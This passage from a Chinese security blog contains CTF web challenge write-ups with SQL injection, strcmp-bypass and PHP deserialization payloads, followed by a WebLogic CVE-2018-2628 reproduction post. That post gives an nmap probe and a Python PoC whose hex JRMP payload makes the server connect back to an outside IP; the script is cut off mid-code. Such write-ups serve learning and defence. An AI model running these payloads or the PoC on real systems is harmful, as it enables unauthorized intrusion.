<h2 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h2><h3 id="题目链接：http-way-nuptzj-cn-php-index-php"><a href="#题目链接：http-way-nuptzj-cn-php-index-php" class="headerlink" title="题目链接：http://way.nuptzj.cn/php/index.php"></a>题目链接：<a href="http://way.nuptzj.cn/php/index.php" target="_blank" rel="noopener">http://way.nuptzj.cn/php/index.php</a></h3><h3 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-17"><a href="#解题方法-17" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-17"><a href="#flag-17" class="headerlink" title="flag"></a>flag</h3><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web4-xxx-php"><a href="#题目链接：http-chinalover-sinaapp-com-web4-xxx-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web4/xxx.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web4/xxx.php</a></h3><h3 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE23.png" alt><br>根据提示，猜测应该是伪造IP。</p>
<h3 id="解题方法-18"><a href="#解题方法-18" class="headerlink" title="解题方法"></a>解题方法</h3><p>BP抓包，伪造IP。。。。。。。<br>这题好像不能做了。。。。。。</p>
<h3 id="flag-18"><a href="#flag-18" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{happy_http_headers}</code></p>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><h3 id="题目链接：http-way-nuptzj-cn-web5"><a href="#题目链接：http-way-nuptzj-cn-web5" class="headerlink" title="题目链接：http://way.nuptzj.cn/web5/"></a>题目链接：<a href="http://way.nuptzj.cn/web5/" target="_blank" rel="noopener">http://way.nuptzj.cn/web5/</a></h3><h3 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-19"><a href="#解题方法-19" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-19"><a href="#flag-19" class="headerlink" title="flag"></a>flag</h3><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><h3 id="题目链接：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html"><a href="#题目链接：http-teamxlc-sinaapp-com-web5-21232f297a57a5a743894a0e4a801fc3-index-html" class="headerlink" title="题目链接：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html"></a>题目链接：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a></h3><h3 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE22.png" alt></p>
<ol>
<li>上传一张1.jpg文件，出现如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; .jpg [1] &#x3D;&gt; jpg ) Upload: 1.jpg</span><br><span class="line">Type: image&#x2F;jpeg</span><br><span class="line">Size: 0 Kb</span><br><span class="line">Stored in: .&#x2F;uploads&#x2F;8a9e5f6a7a789acb.phparray(4) &#123; [&quot;dirname&quot;]&#x3D;&gt; string(9) &quot;.&#x2F;uploads&quot; [&quot;basename&quot;]&#x3D;&gt; string(5) &quot;1.jpg&quot; [&quot;extension&quot;]&#x3D;&gt; string(3) &quot;jpg&quot; [&quot;filename&quot;]&#x3D;&gt; string(1) &quot;1&quot; &#125;</span><br><span class="line">必须上传成后缀名为php的文件才行啊！</span><br></pre></td></tr></table></figure></li>
<li>上传一个1.php文件，出现如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; .php [1] &#x3D;&gt; php ) </span><br><span class="line">不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="解题方法-20"><a href="#解题方法-20" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-20"><a href="#flag-20" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{welcome_to_hacks_world}</code></p>
<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><h3 id="题目链接：http-chinalover-sinaapp-com-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.php</a></h3><h3 id="解题思路-21"><a href="#解题思路-21" class="headerlink" title="解题思路"></a>解题思路</h3><p>源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user &#x3D; trim($_POST[user]);</span><br><span class="line">  $pass &#x3D; md5(trim($_POST[pass]));</span><br><span class="line">  $sql&#x3D;&quot;select user from ctf where (user&#x3D;&#39;&quot;.$user.&quot;&#39;) and (pw&#x3D;&#39;&quot;.$pass.&quot;&#39;)&quot;;</span><br><span class="line">    echo &#39;&lt;&#x2F;br&gt;&#39;.$sql;</span><br><span class="line">  $query &#x3D; mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]&#x3D;&#x3D;&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>trim（）是去除两侧空格,pass经过MD5加密。</p>
<h3 id="解题方法-21"><a href="#解题方法-21" class="headerlink" title="解题方法"></a>解题方法</h3><p>点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格<br>所以尝试传入user为 <code>admin’)--</code>其中 <code>‘）</code>用来分别用来闭合,<code>--</code>用来把后面给注释掉<br>这样最后的查询语句为</p>
<p><code>select user from ctf where (user=&#39;admin&#39;)</code></p>
<h3 id="flag-21"><a href="#flag-21" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{ni_ye_hui_sql?}</code></p>
<h2 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web21"><a href="#题目链接：http-chinalover-sinaapp-com-web21" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web21/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a></h3><h3 id="解题思路-22"><a href="#解题思路-22" class="headerlink" title="解题思路"></a>解题思路</h3><p>源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;@$_POST[&#39;pass&#39;];</span><br><span class="line">$pass1&#x3D;***********;&#x2F;&#x2F;被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>根据代码，<code>pass</code>和<code>pass1</code>经过<code>strcmp</code>比较之后结果为0.</p>
<h3 id="解题方法-22"><a href="#解题方法-22" class="headerlink" title="解题方法"></a>解题方法</h3><p><code>strcmp(array,string)=null=0</code><br>构造payload：<code>?pass[]=1</code></p>
<h3 id="flag-22"><a href="#flag-22" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{strcmp_is_n0t_3afe}</code></p>
<h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web12-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-web12-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web12/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php</a></h3><h3 id="解题思路-23"><a href="#解题思路-23" class="headerlink" title="解题思路"></a>解题思路</h3><p>源代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">        $one &#x3D; ord(&#39;1&#39;);</span><br><span class="line">        $nine &#x3D; ord(&#39;9&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit &#x3D; ord($number&#123;$i&#125;);</span><br><span class="line">                if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $number &#x3D;&#x3D; &#39;54975581388&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$flag&#x3D;&#39;*******&#39;;</span><br><span class="line">if(noother_says_correct($_GET[&#39;key&#39;]))</span><br><span class="line">    echo $flag;</span><br><span class="line">else </span><br><span class="line">    echo &#39;access denied&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>传进去的<code>key</code>要是数，但又不能包含数字。</p>
<h3 id="解题方法-23"><a href="#解题方法-23" class="headerlink" title="解题方法"></a>解题方法</h3><p>转换进制，将key转换为十六进制即可。54975581388=0xccccccccc<br>payload:<code>?key=0xccccccccc</code></p>
<h3 id="flag-23"><a href="#flag-23" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{follow_your_dream}</code></p>
<h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><h3 id="题目链接：http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-3D-3D"><a href="#题目链接：http-nctf-nuptzj-cn-web13-index-php-user1-Y3RmdXNlcg-3D-3D" class="headerlink" title="题目链接：http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D"></a>题目链接：<a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D</a></h3><h3 id="解题思路-24"><a href="#解题思路-24" class="headerlink" title="解题思路"></a>解题思路</h3><p>既然是<code>admin</code>的密码，怎么用户回事<code>ctfuser</code>呢？<br>抓包，将<code>ctfuser</code>改成<code>admin</code>，发现不行。<br>注意到：<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE24.png" alt><br>地址栏url传了一个user参数，<code>Y3RmdXNlcg%3D%3D</code>url解密之后<code>Y3RmdXNlcg==</code>,在经过bash64解密之后为<code>ctfuser</code>。<br>所有<code>admin</code>bash64加密<code>YWRtaW4=</code>,再url加密<code>%59%57%52%74%61%57%34%3d</code><br>构造payload：<code>?user1=YWRtaW4=</code>。</p>
<h3 id="解题方法-24"><a href="#解题方法-24" class="headerlink" title="解题方法"></a>解题方法</h3><h2 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h2><h3 id="题目链接：http-115-28-150-176-php1-index-php"><a href="#题目链接：http-115-28-150-176-php1-index-php" class="headerlink" title="题目链接：http://115.28.150.176/php1/index.php"></a>题目链接：<a href="http://115.28.150.176/php1/index.php" target="_blank" rel="noopener">http://115.28.150.176/php1/index.php</a></h3><h3 id="解题思路-25"><a href="#解题思路-25" class="headerlink" title="解题思路"></a>解题思路</h3><p>源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;pass&#39;])) &#123;</span><br><span class="line">    $pass &#x3D; $_GET[&#39;pass&#39;];</span><br><span class="line"></span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass&#x3D;stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o &#x3D; unserialize($pass);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret &#x3D; &quot;*&quot;;</span><br><span class="line">        if ($o-&gt;secret &#x3D;&#x3D;&#x3D; $o-&gt;enter)</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else </span><br><span class="line">            echo &quot;Oh no... You can&#39;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码的意思就是，一个字符串经过反序列化之后，<code>enter</code>和<code>secret</code>相等。</p>
<h3 id="解题方法-25"><a href="#解题方法-25" class="headerlink" title="解题方法"></a>解题方法</h3><p>构造poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class just4fun</span><br><span class="line">&#123;</span><br><span class="line">	var $enter;</span><br><span class="line">	var $secret;</span><br><span class="line">	function just4fun()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;enter &#x3D; &amp;$this-&gt;secret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test &#x3D; new just4fun();</span><br><span class="line"></span><br><span class="line">echo serialize($test);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到payload：<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}-+</code></p>
<h3 id="flag-24"><a href="#flag-24" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{serialize_and_unserialize}</code></p>
<h2 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web15-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-web15-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web15/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a></h3><h3 id="解题思路-26"><a href="#解题思路-26" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-26"><a href="#解题方法-26" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-25"><a href="#flag-25" class="headerlink" title="flag"></a>flag</h3><h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><h3 id="题目链接：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php"><a href="#题目链接：http-teamxlc-sinaapp-com-web3-b0b0ad119f425408fc3d45253137d33d-index-php" class="headerlink" title="题目链接：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php"></a>题目链接：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a></h3><h3 id="解题思路-27"><a href="#解题思路-27" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-27"><a href="#解题方法-27" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-26"><a href="#flag-26" class="headerlink" title="flag"></a>flag</h3><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><h3 id="题目链接：-1"><a href="#题目链接：-1" class="headerlink" title="题目链接："></a>题目链接：</h3><h3 id="解题思路-28"><a href="#解题思路-28" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-28"><a href="#解题方法-28" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-27"><a href="#flag-27" class="headerlink" title="flag"></a>flag</h3><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><h3 id="题目链接：http-4-chinalover-sinaapp-com-web6-index-php"><a href="#题目链接：http-4-chinalover-sinaapp-com-web6-index-php" class="headerlink" title="题目链接：http://4.chinalover.sinaapp.com/web6/index.php"></a>题目链接：<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web6/index.php</a></h3><h3 id="解题思路-29"><a href="#解题思路-29" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-29"><a href="#解题方法-29" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-28"><a href="#flag-28" class="headerlink" title="flag"></a>flag</h3><h2 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h2><h3 id="题目链接：http-cms-nuptzj-cn"><a href="#题目链接：http-cms-nuptzj-cn" class="headerlink" title="题目链接：http://cms.nuptzj.cn/"></a>题目链接：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a></h3><h3 id="解题思路-30"><a href="#解题思路-30" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-30"><a href="#解题方法-30" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-29"><a href="#flag-29" class="headerlink" title="flag"></a>flag</h3><h2 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h2><h3 id="题目链接：http-nctf-nuptzj-cn-web14-index-php"><a href="#题目链接：http-nctf-nuptzj-cn-web14-index-php" class="headerlink" title="题目链接：http://nctf.nuptzj.cn/web14/index.php"></a>题目链接：<a href="http://nctf.nuptzj.cn/web14/index.php" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web14/index.php</a></h3><h3 id="解题思路-31"><a href="#解题思路-31" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-31"><a href="#解题方法-31" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-30"><a href="#flag-30" class="headerlink" title="flag"></a>flag</h3>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic复现之Java反序列化</title>
    <url>/posts/37247.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>weblogic的最后一个漏洞，Java反序列化，以前没学过Java，也没学过Java反序列化。。。。</p>
<h3 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h3><p>Java序列化： 即把Java对象转换为字节序列的过程</p>
<p>Java反序列化： 是指把字节序列恢复为Java对象的过程</p>
<p>目的： 为了让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储</p>
<h3 id="相关历史漏洞"><a href="#相关历史漏洞" class="headerlink" title="相关历史漏洞"></a>相关历史漏洞</h3><ul>
<li>CVE-2015-4852<br>Weblogic 直接反序列化<br>是基于Weblogic t3协议引起远程代码执行的反序列化漏洞 </li>
<li>CVE-2016-0638<br>Weblogic 直接反序列化<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 漏洞实为CVE-2015-4852绕过 拜Oracle一直以来的黑名单修复方式所赐 </li>
<li>CVE-2016-3510<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 </li>
<li>CVE-2017-3248<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于Weblogic JRMP反序列化 </li>
<li>CVE-2018-2628<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于 Weblogic JRMP反序列化 </li>
<li>CVE-2018-2893<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 实为CVE-2018-2628绕过 同样拜Oracle一直以来的黑名单修复方式所赐 属于Weblogic JRMP反序列化</li>
</ul>
<h3 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.6.0</span><br><span class="line">12.1.3.0</span><br><span class="line">12.2.1.2</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ol>
<li><p>nmap探测目标信息，是否正在使用T3协议</p>
<p><code>nmap -n -v -p 7001 192.168.220.141 --script=weblogic-t3-info</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">7001&#x2F;tcp open  afs3-callback</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用python脚本探测目标是否存在Java反序列化漏洞</p>
<p>探测脚本：(基于python2)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># FileName:     weblogic_poc.py</span><br><span class="line">#先进行T3的握手，成功了就发送第一步的payload，然后发送RequestObject，尝试让weblogic反连自己，然后发送恶意数据，通过回显判定恶意特征串来判定是否存在漏洞</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">socket.setdefaulttimeout(5)</span><br><span class="line">VUL&#x3D;[&#39;CVE-2018-2628&#39;]</span><br><span class="line">PAYLOAD&#x3D;[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;]</span><br><span class="line">VER_SIG&#x3D;[&#39;\\$Proxy[0-9]+&#39;]</span><br><span class="line">def t3handshake(sock,server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    #print &#39;handshake successful&#39;</span><br><span class="line">def buildT3RequestObject(sock,port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span><br><span class="line">def sendEvilObjData(sock,data):</span><br><span class="line">	payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span><br><span class="line">    payload+&#x3D;data</span><br><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span><br><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    count &#x3D; 1024</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            res +&#x3D; sock.recv(4096)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            count -&#x3D; 1</span><br><span class="line">            if count &lt;&#x3D; 0:</span><br><span class="line">                break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        pass</span><br><span class="line">    return res</span><br><span class="line">def checkVul(res,server_addr,index):</span><br><span class="line">    